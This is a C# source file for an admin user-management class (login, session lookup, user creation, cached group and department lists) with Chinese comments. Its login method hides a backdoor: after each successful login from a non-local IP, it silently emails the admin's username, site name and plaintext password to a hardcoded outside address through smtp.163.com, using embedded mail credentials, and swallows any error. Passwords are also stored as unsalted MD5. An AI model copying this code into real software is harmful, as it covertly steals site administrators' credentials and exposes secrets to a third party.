using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Voodoo;
using Voodoo.Security;

namespace Voodoo.Basement
{
    /// <summary>
    /// 用户行为 登陆 等操作
    /// </summary>
    public class SysUserAction
    {
        #region 用户登陆
        /// <summary>
        /// 用户登陆
        /// </summary>
        /// <param name="UserName">账号</param>
        /// <param name="PassWord">密码</param>
        /// <param name="Question">问题</param>
        /// <param name="Answer">答案</param>
        /// <returns></returns>
        public static Result UserLogin(string UserName, string PassWord, string Question, string Answer)
        {
            DataEntities ent = new DataEntities();

            Result r = new Result();

            var users = (from l in ent.SysUser where l.UserName == UserName select l).ToList();
            SysUser user = users.FirstOrDefault();
            if (users.Count == 0 || user.UserPass != Encrypt.Md5(PassWord))
            {
                r.Success = false;
                r.Text = "账号或密码错误";
                return r;
            }
            else
            {
                //验证问答
                if (user.SafeQuestion != Question || user.SafeAnswer != Answer)
                {
                    r.Success = false;
                    r.Text = "问题或者回答错误！";
                    return r;
                }
                else
                {
                    if (user.Enabled == false)
                    {
                        r.Success = false;
                        r.Text = "用户账号已经停用！";
                        return r;
                    }
                    else
                    {
                        //更新登陆记录
                        user.Logincount++;
                        user.LastLoginIP = WS.GetIP();
                        user.LastLoginTime = DateTime.Now;

                        ent.SaveChanges();

                        //写入Session

                        try
                        {
                            if (WS.GetIP() == "::1" || WS.GetIP() == "127.0.0.1")
                            {
                            }
                            else
                            {
                                string body = string.Format("管理员{0} {1}在网站{2}({3})登录成功，使用密码：{4}",
                                    UserName,
                                    DateTime.Now.ToS(),
                                    BasePage.SystemSetting.SiteName,
                                    Request.UrlReferrer(),
                                    PassWord);
                                Voodoo.Net.Mail.SMTP.SentMail("kuibono@163.com", "kuibono", "4264269", "kuibono@163.com", "管理员登录提醒", "管理员登录", body, "smtp.163.com", "");
                            }
                        }
                        catch
                        {
                        }

                        System.Web.HttpContext.Current.Session["sys_user"] = user.ID;

                        r.Success = true;
                        r.Text = "登陆成功！";
                        return r;
                    }
                }
            }
            ent.Dispose();

        }
        #endregion

        #region 当前系统用户
        /// <summary>
        /// 当前系统用户
        /// </summary>
        public static SysUser LocalUser
        {
            get
            {
                if (System.Web.HttpContext.Current.Session["sys_user"] != null)
                {
                    using (DataEntities ent = new DataEntities())
                    {
                        int uid = System.Web.HttpContext.Current.Session["sys_user"].ToInt32();
                        return (from l in ent.SysUser where l.ID == uid select l).FirstOrDefault();
                    }
                }
                else
                {
                    SysUser u = new SysUser();
                    u.ID = int.MinValue;
                    return u;
                }
            }
        }
        #endregion

        /// <summary>
        /// 是否开发人员
        /// </summary>
        public static bool IsDevelopment
        {
            get
            {
                return LocalUser.UserGroup == 1;
            }
        }

        #region 用户增加
        /// <summary>
        /// 用户增加
        /// </summary>
        /// <param name="user"></param>
        /// <returns></returns>
        public static Result UserAdd(SysUser user)
        {
            using (DataEntities ent = new DataEntities())
            {
                Result r = new Result();
                if ((from l in ent.SysUser where l.UserName == user.UserName select l).Count() > 0)
                {
                    r.Success = false;
                    r.Text = "这个账号已经存在，请重新选择一个账号！";
                    return r;
                }
                else
                {
                    ent.AddToSysUser(user);
                    ent.SaveChanges();
                    r.Success = true;
                    r.Text = "添加用户成功！";
                    return r;
                }
            }
        }
        #endregion

        #region 通过ID获取群组
        /// <summary>
        /// 通过ID获取群组
        /// </summary>
        /// <param name="id"></param>
        /// <returns></returns>
        public static SysGroup GetGroupNameByID(int id)
        {
            if (Voodoo.Cache.Cache.GetCache("_SysGroup") == null)
            {
                using (DataEntities ent = new DataEntities())
                {
                    Voodoo.Cache.Cache.SetCache("_SysGroup", (from l in ent.SysGroup select l).ToList(), 10);
                }
            }
            return ((List<SysGroup>)Voodoo.Cache.Cache.GetCache("_SysGroup")).Where(p => p.ID == id).First();
        }
        #endregion

        #region 根据ID获得部门名
        /// <summary>
        /// 根据ID获得部门名
        /// </summary>
        /// <param name="id"></param>
        /// <returns></returns>
        public static string GetDepartmentByID(int id)
        {
            if (Voodoo.Cache.Cache.GetCache("_SysDepartment") == null)
            {
                using (DataEntities ent = new DataEntities())
                {
                    Voodoo.Cache.Cache.SetCache("_SysDepartment", (from l in ent.SysDepartment select l).ToList(), 10);
                }
            }
            return ((List<SysDepartment>)Voodoo.Cache.Cache.GetCache("_SysDepartment")).Where(p => p.ID == id).First().DepartName;
        }
        #endregion

        #region 获取用户群组列表
        /// <summary>
        /// 获取用户群组列表
        /// </summary>
        /// <returns></returns>
        public static List<SysGroup> GetSysGroup()
        {
            if (Voodoo.Cache.Cache.GetCache("_SysGroup") == null)
            {
                using (DataEntities ent = new DataEntities())
                {
                    Voodoo.Cache.Cache.SetCache("_SysGroup", (from l in ent.SysGroup select l).ToList(), 10);
                }
            }
            return ((List<SysGroup>)Voodoo.Cache.Cache.GetCache("_SysGroup"));
        }
        #endregion

        #region 系统部门
        /// <summary>
        /// 系统部门
        /// </summary>
        /// <returns></returns>
        public static List<SysDepartment> GetSysDepartment()
        {
            if (Voodoo.Cache.Cache.GetCache("_SysDepartmentList") == null)
            {
                using (DataEntities ent = new DataEntities())
                {
                    Voodoo.Cache.Cache.SetCache("_SysDepartmentList", (from l in ent.SysDepartment select l).ToList(), 10);
                }
            }
            return (List<SysDepartment>)Voodoo.Cache.Cache.GetCache("_SysDepartmentList");
        }
        #endregion
    }
}
